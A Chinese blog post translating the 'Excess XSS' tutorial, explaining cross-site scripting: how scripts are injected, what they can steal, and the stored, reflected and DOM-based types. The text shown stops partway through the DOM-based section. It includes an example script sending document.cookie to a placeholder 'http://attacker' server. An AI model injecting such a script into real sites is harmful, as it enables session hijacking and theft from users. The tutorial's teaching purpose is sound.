---
layout: post
title: 【Excess XSS译文】了解XSS攻击
description: "Just about everything you'll need to style in the theme: headings, paragraphs, blockquotes, tables, code blocks, and more."
modified: 2016-01-23
tags: [javascript, front-end, xss, safety]
image:
  feature: abstract-3.jpg
  credit: dargadgetz
  creditlink: http://www.dargadgetz.com/ios-7-abstract-wallpaper-pack-for-iphone-5-and-ipod-touch-retina/
comments: true
share: true
---

上一周被一个xss的问题困恼，通过阅读一篇关于xss的入门文章：[Excess XSS](http://excess-xss.com/)，让我重新捡起了xss的有关知识，觉得这篇文章很不错，通俗易懂、深入浅出，于是想翻译出来分享给大家。本篇译文分为两部分，首先是关于原文[Excess XSS](http://excess-xss.com/)的翻译。第二部分是关于我上周工作中遇到的一个有趣的XSS问题以及解决办法。

本文的原地址：http://excess-xss.com/

## 第一部分：概述

### 什么是XSS

跨站点脚本（Cross-site scripting，XSS）是一种脚本注入式攻击，允许攻击者在另一个用户的浏览器中执行恶意的脚本。

攻击者并不直接锁定某个受害者。而是利用一个受害者可能会访问的安全性薄弱的网站，通过这个网站替攻击者间接把恶意代码呈现给受害者。对于受害者的浏览器而言，这些恶意代码也是网站的合法的一部分，网站也就无意中成了攻击者的帮凶。

### 恶意代码是如何注入的

对于攻击者来说能够让受害者浏览器执行恶意代码的唯一方式，就是把代码注入受害者从网站上下载的页面中。如果网站直接把用户的输入作为页面呈现的一部分时，这是有可能发生的。因为攻击者可以以字符串的形式插入页面一段代码，这样就有可能在受害者的浏览器中被执行。

下面的例子是一个简单的服务端脚本，作用是展现网站上最新的评论:

```
print "<html>"
print "Latest comment:"
print database.latestComment
print "</html>"
```

这段脚本假设评论只包含文本。但是因为用户的输入是存入，一个攻击者可能提交这样的评论:`<script>...</script>`。任何访问这个页面的用户都会收到下面这样的内容：

```
<html>
Latest comment:
<script>...</script>
</html>
```

当用户的浏览器加载页面时，浏览器会执行包含在`<script>`标签中的任何脚本。这样以来攻击者就成功的完成了一次攻击。

### 什么是恶意脚本

首先，在受害者的浏览器中执行脚本算不上特别的恶意，毕竟在受限的环境中执行的脚本有非常有限的权限访问用户的文件和操作系统。事实上，你现在就可以打开你浏览器的脚本控制台立刻执行任何你想要的脚本，你几乎不可能对你的电脑造成任何的伤害。

但是，当你了解以下几个事实之后脚本变得恶意的可能性就变得越来越清晰了：

- Javascript有权访问一些用户的敏感信息，比如cookie
- Javascript能够通过XMLHttpRequest或者其他一些机制发送带有任何内容的HTTP请求到任何地址。
- Javascript能够通过DOM操作方法对当前页面的HTML做任意修改。

这些事实结合起来会引起非常严重的安全问题，也就是我们接下来要解释的。

### 恶意脚本的后果

这种在用户的浏览器中执行脚本的能力允许攻击者发动以下几类攻击

- Cookie窃取：攻击者能够通过`document.cookie`访问受害者与网站相关的cookie，然后传送到攻击者自己的服务器，接着从这些cookie中提取敏感信息，如Session ID。
- 记录用户行为（Keylogging）：攻击者可以使用 `addEventListener`方法注册用于监听键盘敲击事件，并且把所有用户的敲击行为发送到他自己的服务器，这些敲击行为可能记录着用户的敏感信息，比如密码和信用卡号码。
- 钓鱼网站（Phishing）：攻击者可以通过修改DOM在页面上插入一个假的登陆框，也可以把表单的`action`属性执行他自己的服务器地址，然后欺骗用户提交他自己的敏感信息。

尽管这些攻击类型大不相同，但都有一条重要的相似之处：因为攻击者已经把代码注入进网站提供的页面，所以恶意脚本都是在网站的上下文中执行，这就意味着恶意代码被当作网站提供的其他正常脚本一样对待：它有权访问受害者与网站相关的数据（比如cookie），但此时浏览器地址栏的的主机名（hostname）仍然是原网站的。总而言之，恶意脚本被浏览器认为是网站合法的一部分，允许它做任何事情。

再一次被强调的关键问题是：

>如果攻击者能够借助你的网站在另一个用户的浏览器中执行任意脚本，那么你网站的安全性已经无从谈起了。

为了能够直奔重点，本篇教程中的一些例子都略去了恶意脚本的具体细节，只显示`<script>...</script>`。这表示这段代码是攻击者注入的代码，而不关心代码具体的执行内容

## 第二部分：XSS攻击

### XSS攻击中的各种角色

在我们具体描述XSS攻击时如何运作之前，我们需要定义一下XSS攻击涉及的角色。总的来说，XSS攻击涉及三类角色：**网站**、**受害者**、**攻击者**

- **网站**为发出请求的用户返回网页。在我们的例子中，网站的地址是`http://webiste/`
	- **网站数据库**用于存储显示在页面上的的用户输入的内容。
- **受害者**是一位从浏览器向网站请求页面的普通用户
- **攻击者**是一位打算利用网站XSS漏洞向受害者发动攻击的恶意用户
	- **攻击者服务器**是由攻击者控制服务器，专用于窃取受害者的敏感信息。在我们的例子中，它的地址是：`http://attacker`

### 一个攻击场景实例

在这个例子中，我们假设攻击者的终极目标是利用网站的XSS漏洞窃取受害者的cookie。这可以通过设法让受害者的浏览器解析下面HTML代码来实现：

```
<script>
window.location='http://attacker/?cookie='+document.cookie
</script>
```

这段脚本将用户的浏览器定向到一个完全不同的URL，即触发向攻击者的服务器发送HTTP请求。这串URL把受害者的cookie作为查询参数，当攻击者服务器收到该请求后就能从中把cookie提取出来。一旦攻击者获取到cookie，他就能借助cookie扮演受害者并且发动更多的攻击。

从现在起，上面的HTML就被认为是**恶意文本**或者是**恶意脚本**。非常重要的值得注意的是，恶意代码只有在受害者的浏览器中最终得到解析之后才算得上是恶意，只可能发生网站有XSS缺陷的站点上。

#### 例子是如何工作的

下面的图示展现了攻击者发动的攻击是如何运作的

![]()

1. 攻击者利用网站表单将一段恶意文本插入网站的数据库中
2. 受害者向网站请求页面
3. 网站从数据库中取出了恶意文本把它包含进返回的页面中兵返回给受害者
4. 受害者的浏览器执行返回中的恶意脚本，把受害者的cookie发送给攻击者的服务器。

### XSS类型

虽然XSS攻击的终极目标是在受害者的浏览器中执行恶意脚本，但是实现这个目标的不同途径还是有根本上的差别的。XSS攻击常常被划分为三类：

- 持续型XSS攻击：恶意文本来源于网站的数据库
- 反射型XSS攻击：恶意文本来源于受害者的请求
- 基于DOM的XSS攻击：弱点来自于客户端代码而不是服务端代码

前一个例子说明了一个持续型XSS攻击，我们接下来描述其他两类XSS攻击：反射型XSS和基于DOM的XSS。

#### 反射型XSS攻击

在一个反射型XSS攻击中，恶意文本是受害者发送给网站的请求中的一部分。网站在接下来给用户的返回中也包含了这部分恶意 代码。下面的图示阐述了这个场景

![]()

1. 攻击者构建一个包含恶意文本的URL发送给受害者
2. 受害者被攻击者欺骗通过这个URL向网站发送请求
3. 网站给受害者的返回中包含了来自URL的的恶意文本
4. 受害者的浏览器执行了来自返回中的恶意脚本，把受害者的cookie发送给攻击者的服务器

##### 反射型XSS攻击是如何成功地？

一开始看来，反射型XSS攻击似乎是无害的，因为它要求受害者自己切实的发出一次带有恶意文本的请求。因为没有人愿意攻击他们自己，这样以来这样的攻击就没法实现了。

但结果是，至少存在两种方式使得一位受害者向他自己发动反射型XSS攻击：

- 如果攻击者的目标是一位具体的个人用户，攻击者能够把恶意的链接发送给受害者（比如通过电子邮件或者信息），并且欺骗他去访问这个链接。
- 如果攻击者的目标是一群用户，攻击者能够发布一条指向恶意URL的链接（比如在他的个人网站或者社交网络上），然后等待访问者去点击它。

#### 基于DOM的XSS攻击

基于DOM的XSS是属于持久型和反射型XSS的变种。在基于DOM的XSS的攻击中，除非网站的自身的合法脚本被执行，否则恶意文本不会被受害者的浏览器解析。下面的图示说明了基于反射型XSS攻击的这样一个场景


